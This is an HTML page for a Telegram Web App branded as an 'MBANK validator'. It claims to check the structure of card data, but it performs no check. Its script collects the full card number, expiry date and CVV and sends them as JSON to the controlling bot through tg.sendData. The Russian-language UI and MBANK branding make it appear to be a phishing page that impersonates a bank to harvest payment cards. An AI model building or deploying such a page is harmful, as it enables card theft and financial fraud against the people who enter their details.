<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MBANK Валидатор</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --mbank-green: #24c851;
            --mbank-dark-green: #1ca340;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #f5f5f7);
            color: var(--tg-theme-text-color, #000000);
            margin: 0;
            padding: 16px;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .app-container {
            background: var(--tg-theme-secondary-bg-color, #ffffff);
            padding: 24px;
            border-radius: 20px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.04);
            width: 100%;
            max-width: 360px;
            box-sizing: border-box;
        }
        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .header h2 {
            margin: 0 0 8px 0;
            font-size: 22px;
            font-weight: 700;
            color: var(--mbank-green);
        }
        .header p {
            margin: 0;
            font-size: 13px;
            color: var(--tg-theme-hint-color, #8e8e93);
        }
        .input-group {
            margin-bottom: 18px;
            position: relative;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--tg-theme-hint-color, #8e8e93);
        }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            background: var(--tg-theme-bg-color, #fafafa);
            color: var(--tg-theme-text-color, #000000);
            box-sizing: border-box;
            outline: none;
            transition: all 0.2s ease;
        }
        input:focus {
            border-color: var(--mbank-green);
            box-shadow: 0 0 0 3px rgba(36, 200, 81, 0.15);
        }
        .card-row {
            display: flex;
            gap: 16px;
        }
        .flex-1 {
            flex: 1;
        }
        #cvv_block {
            transition: all 0.3s ease;
        }
        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--mbank-green), var(--mbank-dark-green));
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            box-shadow: 0 4px 12px rgba(36, 200, 81, 0.2);
            transition: transform 0.1s ease;
        }
        .btn-submit:active {
            transform: scale(0.98);
        }
        .card-type-badge {
            position: absolute;
            right: 14px;
            top: 38px;
            font-size: 12px;
            font-weight: bold;
            color: var(--mbank-green);
        }
    </style>
</head>
<body>

<div class="app-container">
    <div class="header">
        <h2>MBANK Валидатор 💳</h2>
        <p>Введите данные карты для проверки структуры</p>
    </div>
    
    <div class="input-group">
        <label for="card_number">Номер карты</label>
        <input type="text" id="card_number" inputmode="numeric" placeholder="4314 2511 ...." maxlength="22">
        <span id="card_type_text" class="card-type-badge"></span>
    </div>

    <div class="card-row">
        <div class="input-group flex-1">
            <label for="card_date">Срок действия</label>
            <input type="text" id="card_date" inputmode="numeric" placeholder="ММ/ГГ" maxlength="5">
        </div>
        <div class="input-group flex-1" id="cvv_block">
            <label for="card_cvv">CVV/CVC</label>
            <input type="password" id="card_cvv" inputmode="numeric" placeholder="***" maxlength="3">
        </div>
    </div>

    <button class="btn-submit" onclick="sendCardData()">Проверить данные</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    const cardInput = document.getElementById('card_number');
    const dateInput = document.getElementById('card_date');
    const cvvBlock = document.getElementById('cvv_block');
    const cvvInput = document.getElementById('card_cvv');
    const typeBadge = document.getElementById('card_type_text');

    // Логика форматирования и скрытия полей
    cardInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        
        // Интеллектуальное определение типа карты на лету
        if (value.startsWith('9417')) {
            typeBadge.innerText = 'ЭЛКАРТ';
            cvvBlock.style.display = 'none'; // Полностью убираем CVV для Элкарт
            cvvInput.value = '';
        } else if (value.startsWith('4')) {
            typeBadge.innerText = 'VISA';
            cvvBlock.style.display = 'block';
        } else if (value.startsWith('5')) {
            typeBadge.innerText = 'MC';
            cvvBlock.style.display = 'block';
        } else {
            typeBadge.innerText = '';
            cvvBlock.style.display = 'block';
        }

        // Разбивка по 4 цифры
        let matches = value.match(/\d{1,4}/g);
        e.target.value = matches ? matches.join(' ') : value;
    });

    // Форматирование даты (ММ/ГГ)
    dateInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
        if (value.length > 2) {
            e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
        } else {
            e.target.value = value;
        }
    });

    // Отправка JSON строки обратно боту
    function sendCardData() {
        if (!cardInput.value || !dateInput.value) {
            tg.showAlert("Пожалуйста, заполните все обязательные поля!");
            return;
        }

        const payload = {
            number: cardInput.value,
            date: dateInput.value,
            cvv: cvvInput.value || "NOT_REQUIRED"
        };
        
        tg.sendData(JSON.stringify(payload));
        tg.close();
    }
</script>
</body>
</html>
